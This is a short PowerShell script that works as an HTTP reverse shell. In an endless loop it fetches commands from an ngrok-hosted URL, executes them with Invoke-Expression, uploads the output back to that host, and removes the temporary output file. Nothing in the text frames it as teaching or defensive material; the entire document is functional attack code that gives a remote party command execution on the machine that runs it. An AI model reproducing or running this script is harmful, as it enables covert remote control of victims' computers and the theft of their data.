
$Uri = "http://2a5f-87-49-45-68.ngrok.io/rs"
$wc = New-Object System.Net.WebClient
while ($true) {
    $Data = @{
        "input_path" = "PS " + $pwd + ">"
    }
    $Response = Invoke-WebRequest -Uri $Uri -Method Get -Headers $Data
    Invoke-Expression ([string]($Response.Content)) | Out-File "$env:TEMP/rs_last_out_temp"
    $wc.UploadFile($Uri + "/out", "$env:TEMP/rs_last_out_temp")
    Remove-Item "$env:TEMP/rs_last_out_temp"
}
